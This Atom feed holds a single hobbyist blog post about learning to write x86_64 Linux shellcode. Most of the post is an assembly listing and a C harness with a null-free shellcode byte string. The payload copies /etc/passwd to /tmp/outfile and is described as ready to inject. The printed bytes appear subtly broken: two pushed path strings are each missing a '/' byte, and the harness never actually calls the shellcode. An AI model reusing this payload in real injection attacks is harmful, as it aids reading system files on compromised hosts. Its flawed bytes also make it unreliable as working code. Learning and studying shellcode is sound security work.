<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Shellcode | Chiggins Thoughts]]></title>
  <link href="http://chigstuff.com/blog/categories/shellcode/atom.xml" rel="self"/>
  <link href="http://chigstuff.com/"/>
  <updated>2015-04-28T14:09:05-05:00</updated>
  <id>http://chigstuff.com/</id>
  <author>
    <name><![CDATA[Chris Higgins]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[My First Shellcode]]></title>
    <link href="http://chigstuff.com/blog/2014/03/29/my-first-shellcode/"/>
    <updated>2014-03-29T17:11:42-05:00</updated>
    <id>http://chigstuff.com/blog/2014/03/29/my-first-shellcode</id>
    <content type="html"><![CDATA[<p>Lately I&rsquo;ve been wanting to explore some of what I call the &ldquo;black magic&rdquo; of infosec, reverse engineering and shellcoding. Whenever I see some posting or article that comes out on this I always become curious and bewildered at what I&rsquo;m looking at because I just don&rsquo;t understand it. On Twitter I&rsquo;ve been seeing <a href="http://twitter.com/SecurityTube">@SecurityTube</a> advertise their <a href="http://www.pentesteracademy.com/course?id=7">x86_64 Assembly and Shellcoding on Linux</a> video course, so I decided to drop some money and learn what I can from it. I&rsquo;ve yet to fully finish it, but more on that later.</p>

<!--more-->


<p>If I want to learn something, I usually have to do that something, get the hands on experience. I&rsquo;m only about a third of the way through the course, only just going through assembly basics. But I decided to take a small break and try to write some shellcode of my own. I went exploring through the <a href="http://shell-storm.org/shellcode/">Shellcode Database</a> and found a bit of x86 shellcode that I wanted to translate over to work on an x86_64 system. After some searching, I found one that <a href="http://www.shell-storm.org/shellcode/files/shellcode-864.php">copies /etc/passwd to /tmp/outfile</a> written by <a href="https://github.com/polslinux">Paolo Stivanin</a>. Because of how trivial and simple looking the shellcode was, I decided to translate it over to work on x86_64.</p>

<p>After a few days of constant Googling and debugging and spending more time in gdb I&rsquo;d care to admit, I finally got a working bit of shellcode that works on x86_64 Linux that copies the contents of /etc/passwd to /tmp/outfile. It is sitting at 118 bytes and contains no null bytes, so you&rsquo;ll be able to inject it when necessary. I know it is nothing super fancy but it works and hopefully it can be found useful to someone.</p>

<p>For those that are interested in dissecting the following code, it is using the sys_open, sys_read, and sys_write syscalls. This might be able to use some optimization, so if anyone finds anything please let me know!</p>

<p><div><script src='https://gist.github.com/9820129.js'></script>
<noscript><pre><code>/*
Reads data from /etc/passwd to /tmp/outfile
No null bytes

Author: Chris Higgins &lt;chris@chigs.me&gt;
        @ch1gg1ns -- github.com/chiggins
        chigstuff.com
Date:   3-27-2014
Size:   118 bytes
Tested: ArchLinux x86_64 3.13.6-1
Assembly:
        xor rax, rax
        mov al, 2
        xor rdi, rdi
        mov rbx, 0x647773
        push rbx
        mov rbx, 0x7361702f6374652f
        push rbx
        lea rdi, [rsp]
        xor rsi, rsi
        syscall
        mov rbx, rax
        xor rax, rax
        mov rdi, rbx
        mov rsi, rsp
        mov dx, 0xFFFF
        syscall
        mov r8, rax
        mov rax, rsp
        xor rbx, rbx
        push rbx
        mov rbx, 0x656c6966
        push rbx
        mov rbx, 0x74756f2f706d742f
        push rbx
        mov rbx, rax
        xor rax, rax
        mov al, 2
        lea rdi, [rsp]
        xor rsi, rsi
        push 0x66
        pop si
        syscall
        mov rdi, rax
        xor rax, rax
        mov al, 1
        lea rsi, [rbx]
        xor rdx, rdx
        mov rdx, r8
        syscall
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char shellcode[] = &quot;\x48\x31\xc0\xb0\x02\x48\x31\xff\xbb\x73\x77\x64\x00\x53\x48\xbb\x2f\x65\x74\x63\x70\x61\x73\x53\x48\x8d\x3c\x24\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x66\xba\xff\xff\x0f\x05\x49\x89\xc0\x48\x89\xe0\x48\x31\xdb\x53\xbb\x66\x69\x6c\x65\x53\x48\xbb\x2f\x74\x6d\x70\x6f\x75\x74\x53\x48\x89\xc3\x48\x31\xc0\xb0\x02\x48\x8d\x3c\x24\x48\x31\xf6\x6a\x66\x66\x5e\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x01\x48\x8d\x33\x48\x31\xd2\x4c\x89\xc2\x0f\x05&quot;;

int main() {
    printf(&quot;len: %d bytes&quot;, sizeof shellcode);
    (*(void (*)()) shellcode);
    return 0;
}
</code></pre></noscript></div>
</p>

<p>Resources:<br />
<a href="http://www.shell-storm.org/shellcode/files/shellcode-867.php">http://www.shell-storm.org/shellcode/files/shellcode-867.php</a></p>

<p><a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64">http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64</a></p>

<p><a href="http://man7.org/linux/man-pages/man2/open.2.html">http://man7.org/linux/man-pages/man2/open.2.html</a></p>

<p><a href="https://en.wikipedia.org/wiki/X86-64">https://en.wikipedia.org/wiki/X86-64</a></p>

<p><a href="http://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump">http://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump</a></p>
]]></content>
  </entry>
  
</feed>
